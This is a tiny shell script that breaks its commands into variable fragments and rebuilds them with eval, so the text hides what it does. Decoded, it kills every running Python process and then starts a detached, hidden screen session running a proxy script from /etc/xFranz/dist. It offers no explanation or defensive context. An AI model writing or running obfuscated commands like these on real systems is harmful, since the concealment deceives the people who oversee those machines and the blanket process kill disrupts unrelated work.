z="
";Bz='l py';Fz='dmS ';Ez='en -';Nz='oxy.';Az='pkil';Mz='t/pr';Oz='py 1';Gz='prox';Pz='6';Cz='thon';Kz='ranz';Lz='/dis';Dz='scre';Hz='y py';Iz=' /et';Jz='c/xF';
eval "$Az$Bz$Cz$z$Dz$Ez$Fz$Gz$Hz$Cz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz"